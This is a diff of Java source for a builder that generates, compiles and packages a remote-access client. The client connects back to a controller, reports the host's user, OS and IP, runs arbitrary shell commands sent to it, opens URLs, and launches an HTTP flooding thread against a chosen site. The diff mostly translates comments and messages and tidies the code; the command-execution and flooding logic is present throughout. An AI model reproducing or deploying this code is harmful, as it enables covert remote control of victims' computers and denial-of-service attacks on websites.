@@ -8,23 +8,21 @@ import java.io.IOException;
 /**
  * Created by Jeferson Machado on 07/08/2017.
  */
-public class MakeClient {
-    final String ABSOLUT_PATH = new File(".").getCanonicalPath();
-    String ip = "localhost";
-    String port = "8694";
+class MakeClient {
+    private final String ABSOLUTE_PATH = new File(".").getCanonicalPath();
 
-    public MakeClient(String ip, String port) throws IOException {
-        this.ip = ip;
-        this.port = port;
+    MakeClient(String ip, String port) throws IOException {
 
-        String clientString = "import java.io.*;\n" +
+        String clientString = "\n" +
+                "import java.io.*;\n" +
                 "import java.net.*;\n" +
                 "\n" +
+                "/**\n" +
+                " * Created by Douglas Giovanella on 31/07/2017.\n" +
+                " */\n" +
                 "public class Client {\n" +
                 "\n" +
                 "    private Socket socket;\n" +
-                "    private OutputStream ou;\n" +
-                "    private Writer ouw;\n" +
                 "    private BufferedWriter bfw;\n" +
                 "\n" +
                 "    public static void main(String[] args) throws IOException {\n" +
@@ -36,14 +34,14 @@ public class MakeClient {
                 "    private void connect() throws IOException {\n" +
                 "        do {\n" +
                 "            try {\n" +
-                "                socket = new Socket(\"" + ip + "\"," + port + ");\n" +
-                "                ou = socket.getOutputStream();\n" +
+                "                socket = new Socket(\"" + ip + "\", " + port + ");\n" +
+                "                OutputStream ou = socket.getOutputStream();\n" +
                 "\n" +
-                "                ouw = new OutputStreamWriter(ou);\n" +
+                "                Writer ouw = new OutputStreamWriter(ou);\n" +
                 "                bfw = new BufferedWriter(ouw);\n" +
                 "\n" +
                 "            } catch (Exception e) {\n" +
-                "                System.err.println(e);\n" +
+                "                System.err.println(e.getMessage());\n" +
                 "            }\n" +
                 "\n" +
                 "        } while (socket == null);\n" +
@@ -61,7 +59,6 @@ public class MakeClient {
                 "\n" +
                 "\n" +
                 "        bfw.write(\"[\" + osCountry + \"]\" + osUser + \" - \" + osName + \" - [\" + ipUser + \"]\\r\\n+\");\n" +
-                "        //enviarMensagem(\"Computer IP: \" + ipAddress.getHostAddress() + \" Connected\");\n" +
                 "        bfw.flush();\n" +
                 "    }\n" +
                 "\n" +
@@ -92,75 +89,58 @@ public class MakeClient {
                 "            if (bfr.ready()) {\n" +
                 "                msg = bfr.readLine();\n" +
                 "                String[] msgFormatted = msg.split(\"&\");\n" +
-                "\n" +
-                "                switch (Integer.parseInt(msgFormatted[0])) {\n" +
-                "                    case 0:\n" +
-                "                        Runtime.getRuntime().exec(msgFormatted[1]);\n" +
-                "                        sendMessage(\"Computador programado para desligar!\");\n" +
-                "                        break;\n" +
-                "                    case 1:\n" +
-                "                        try {\n" +
+                "                try {\n" +
+                "                    switch (Integer.parseInt(msgFormatted[0])) {\n" +
+                "                        case 0:\n" +
+                "                            Runtime.getRuntime().exec(msgFormatted[1]);\n" +
+                "                            sendMessage(\"Computer programed to turn off!!!\");\n" +
+                "                            break;\n" +
+                "                        case 1:\n" +
                 "                            java.awt.Desktop.getDesktop().browse(new URI(msgFormatted[1]));\n" +
-                "                            sendMessage(\"Site \" + msgFormatted[1] + \" aberto!\");\n" +
-                "                        } catch (Exception e) {\n" +
-                "                            e.printStackTrace();\n" +
-                "                            sendMessage(e.getMessage());\n" +
-                "                        }\n" +
-                "                        break;\n" +
-                "                    case 2:\n" +
-                "                        Runtime.getRuntime().exec(msgFormatted[1]);\n" +
-                "                        break;\n" +
-                "                    case 66:\n" +
-                "                        new HTTPAtack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();\n" +
-                "                        break;\n" +
-                "                    default:\n" +
-                "                        sendMessage(\"Erro ao enviar o comando.\");\n" +
-                "                        break;\n" +
+                "                            sendMessage(\"Site \" + msgFormatted[1] + \" open!\");\n" +
+                "                            break;\n" +
+                "                        case 2:\n" +
+                "                            Runtime.getRuntime().exec(msgFormatted[1]);\n" +
+                "                            sendMessage(\"Command executed!\");\n" +
+                "                            break;\n" +
+                "                        case 66:\n" +
+                "                            new HTTPAttack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();\n" +
+                "                            break;\n" +
+                "                        default:\n" +
+                "                            sendMessage(\"Message code invalid!\");\n" +
+                "                            break;\n" +
                 "\n" +
+                "                    }\n" +
+                "                } catch (Exception e) {\n" +
+                "                    sendMessage(\"Error to execute the command! \" +e.getMessage());\n" +
                 "                }\n" +
                 "            }\n" +
                 "    }\n" +
-                "\n" +
-                "    /*\n" +
-                "    private void exit() throws IOException {\n" +
-                "        sendMessage(\"Exit\");\n" +
-                "        bfw.close();\n" +
-                "        ouw.close();\n" +
-                "        ou.close();\n" +
-                "        socket.close();\n" +
-                "    }*/\n" +
                 "}\n" +
                 "\n" +
-                "class HTTPAtack extends Thread {\n" +
+                "class HTTPAttack extends Thread {\n" +
                 "\n" +
-                "    // Intensidad\n" +
+                "\n" +
                 "    private static final int LOW = 1;\n" +
                 "    private static final int MEDIUM = 2;\n" +
                 "    private static final int HIGH = 3;\n" +
                 "\n" +
-                "    // Numero de peticiones segun la intensidad\n" +
                 "    private static final int REQUEST_LOW = 100;\n" +
                 "    private static final int REQUEST_MEDIUM = 200;\n" +
                 "    private static final int REQUEST_HIGH = 500;\n" +
                 "\n" +
-                "    // URL a a atacar\n" +
                 "    private URL url;\n" +
-                "    // Intensidad del ataque\n" +
                 "    private int intensity;\n" +
                 "\n" +
-                "    // Iniciamos la clase\n" +
-                "    HTTPAtack(String url, int intensity) {\n" +
+                "    HTTPAttack(String url, int intensity) {\n" +
                 "        try {\n" +
                 "            this.url = new URL(url);\n" +
                 "            this.intensity = intensity;\n" +
                 "        } catch (Exception e) {\n" +
-                "            System.out.println(e);\n" +
+                "            System.out.println(e.getMessage());\n" +
                 "        }\n" +
                 "    }\n" +
                 "\n" +
-                "    /*\n" +
-                "   * Devuelve el numero de peticiones en funcion de la intensidad\n" +
-                "   */\n" +
                 "    private static int getNumRequest(int intensity) {\n" +
                 "        switch (intensity) {\n" +
                 "            case LOW:\n" +
@@ -172,15 +152,11 @@ public class MakeClient {
                 "        }\n" +
                 "    }\n" +
                 "\n" +
-                "    // Comienza el hilo. Este realiza 100 peticiones HTTP y va mostrando el\n" +
-                "    // tiempo de respuesta de cada peticion\n" +
                 "    public void run() {\n" +
                 "        int i = 0;\n" +
                 "        int request = getNumRequest(this.intensity);\n" +
-                "        // Comenzamos las peticiones\n" +
                 "        while (i < request) {\n" +
                 "            try {\n" +
-                "                // Realizamos la conexion\n" +
                 "                HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();\n" +
                 "                conn.setAllowUserInteraction(true);\n" +
                 "                conn.setConnectTimeout(5000); // 15 sec. connection timeout\n" +
@@ -193,64 +169,67 @@ public class MakeClient {
                 "                conn.connect();\n" +
                 "                conn.getResponseCode();\n" +
                 "            } catch (Exception e) {\n" +
-                "                System.out.println(e);\n" +
+                "                System.out.println(e.getMessage());\n" +
                 "            }\n" +
                 "            i++;\n" +
                 "        }\n" +
                 "    }\n" +
-                "}";
+                "}\n";
 
-        gravarEmArquivoTXT(clientString);
-        compilarJava(ABSOLUT_PATH + "\\Client\\Client.java");
-        gerarPacote();
+        generateTxtFile(clientString);
+        compileJava();
+        generatePackage();
     }
 
-    private void gravarEmArquivoTXT(String clientString) {
+    private void generateTxtFile(String clientString) {
 
-        BufferedWriter fr = null;//Abre arquivo para escrita
+        BufferedWriter fr;//Abre arquivo para escrita
         try {
-            File file = new File(ABSOLUT_PATH + "/Client/");
+            File file = new File(ABSOLUTE_PATH + "/Client/");
             file.mkdir();
-            fr = new BufferedWriter(new FileWriter(ABSOLUT_PATH + "/Client/Client.java", true));
-            fr.write(clientString);//escreve a matricula do aluno no arquivo
-            fr.newLine();//passa para a proxima linha
+            fr = new BufferedWriter(new FileWriter(ABSOLUTE_PATH + "/Client/Client.java", true));
+            fr.write(clientString);
+            fr.newLine();
             fr.flush();
             fr.close();
 
-            File file2 = new File(ABSOLUT_PATH+"/Client/META-INF/");
+            File file2 = new File(ABSOLUTE_PATH + "/Client/META-INF/");
             file2.mkdir();
-            fr = new BufferedWriter(new FileWriter(ABSOLUT_PATH+"/Client/META-INF/MANIFEST.MF", true));
-            fr.write("Manifest-Version: 1.0\r\n");//escreve a matricula do aluno no arquivo
+            fr = new BufferedWriter(new FileWriter(ABSOLUTE_PATH + "/Client/META-INF/MANIFEST.MF", true));
+            fr.write("Manifest-Version: 1.0\r\n");
             fr.write("Main-Class: Client");
-            fr.newLine();//passa para a proxima linha
+            fr.newLine();
             fr.flush();
             fr.close();
 
             String startBat = "java -jar Client.jar";
-            fr = new BufferedWriter(new FileWriter(ABSOLUT_PATH+"/Client/start.bat", true));
-            fr.write(startBat);//escreve a matricula do aluno no arquivo
-            fr.newLine();//passa para a proxima linha
+            fr = new BufferedWriter(new FileWriter(ABSOLUTE_PATH + "/Client/start.bat", true));
+            fr.write(startBat);
+            fr.newLine();
             fr.flush();
             fr.close();
 
         } catch (IOException e) {
             e.printStackTrace();
         }
-
-
     }
 
-    private void compilarJava(String path) throws IOException {
-        Runtime.getRuntime().exec("javac \""+ ABSOLUT_PATH+"\\Client\\Client.java\"");
-    }
-
-    private void gerarPacote() {
+    private void compileJava() {
         try {
-            //Runtime.getRuntime().exec("jar -cvfm Client.jar META-INF\\manifest.mf *.class");
-            //Runtime.getRuntime().exec("jar -cvfm \""+ABSOLUT_PATH+"\\Client\\Client.jar\" \"" + ABSOLUT_PATH +"\\Client\\META-INF\\manifest.mf\" \""+ABSOLUT_PATH+"\\Client\\Client.class \" \""+ABSOLUT_PATH+"\\Client\\HTTPAtack.class\"");
-            Runtime.getRuntime().exec("jar -cvfm \""+ABSOLUT_PATH+"\\Client\\Client.jar\" \"" + ABSOLUT_PATH +"\\Client\\META-INF\\manifest.mf\" *.class");
+            Runtime.getRuntime().exec("javac \"" + ABSOLUTE_PATH + "\\Client\\Client.java\"");
         } catch (IOException e) {
-            System.out.println(e);
+            e.printStackTrace();
+        }
+    }
+
+    private void generatePackage() {
+        try {
+            Thread.sleep(500);
+            Runtime.getRuntime().exec("cmd.exe /c cd " + ABSOLUTE_PATH + File.separator + "Client &" + " jar -cvfm \"Client.jar\" \"META-INF\\manifest.mf\" *.class");
+        } catch (IOException e) {
+            System.out.println(e.getMessage());
+        } catch (InterruptedException e) {
+            e.printStackTrace();
         }
     }
 
